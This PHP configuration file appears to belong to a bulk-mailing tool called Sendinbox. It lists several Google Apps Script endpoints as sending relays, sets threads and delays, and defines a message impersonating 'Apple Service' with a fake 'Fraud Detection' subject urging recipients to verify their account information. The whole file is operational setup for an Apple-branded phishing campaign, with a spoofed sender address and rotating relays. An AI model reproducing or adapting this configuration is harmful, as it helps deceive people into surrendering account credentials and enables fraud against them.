<?php
/**
 * @Author: Eka Syahwan
 * @Date:   2018-08-30 16:54:08
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2018-10-19 03:05:10
 */
class Sendinbox_config
{
	public function server(){

		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbyasOzEbD84lJ2GgFYGVj727nzklZaMBMHCMN1U-rjT0EbGDI-c/exec';
		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbyuxXW9Zim_YjuxSDFHbBDsVR_A7E-d5QbKiYiIxl-6Qn-gpgNz/exec';
		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbxzJIzgDQWrMM0IMkeWdcLLYi1dgqQL-SlW-mSNOWqjW98Ggis/exec';
		$config['server']['multy'][] = 'https://script.google.com/a/supportbinwalfir-information.business/macros/s/AKfycbz0JPLCFo4B-97fqUXZqk8GJ9fmEsYQtLIxU5kOTIub8CZE77Q/exec';
		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbzVmdbD-uyqvgg8or6C0ZsWEt7e73iPaDQ4lsd0EA3QROew5FY_/exec';
		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbw8_xWOkTN67IRZu7ju4--bFAY5iS8vlhqOJJqb737FT1eKmlCn/exec';
		$config['server']['multy'][] = 'https://script.google.com/macros/s/AKfycbzLTiBsHlffXulWOXlYo5n1k6CpdWowmzbUXdlZsXaI2giDlNc/exec';
		
		return $config;

	}
	public function sender(){

		$config['config']['threads'] 				= 5;  				// kirim [value] dalam satu permintaan.
		$config['config']['delay'] 					= 5;  				// [value] delay dalam detik. 
		$config['config']['color'] 					= true;				// aktifkan color atau tidak.
		$config['config']['methode'] 				= 'gmailapp';		// mailapp atau gmailapp

		return $config;
	}
	public function message(){

		/* 
		 	.==========[>- How To Attachment File. -<]==========.
			
			1. upload to google drive
			2. get attachment id  (https://www.jeffreyeverhart.com/wp-content/uploads/2015/01/DriveFileID.png)
			3. permission : public / don't private
			
			** not use attachment ? blank value. ** 
			
		*/
		
		$config['message']['multy']['reaply_to'][] 		= array('name' => 'Apple Service', 'email' => 'noreply-serviceappleclientid@##randstring##.notification.com');
		$config['message']['multy']['subject'][] 		= 'Re: [ $date ] [Update Account] [Fraud Detection] verify your account information';
		$config['message']['multy']['letter'][] 		= 'letter2.html';
		$config['message']['multy']['attachment_id'][] 	= ''; 

		return $config;
	}
}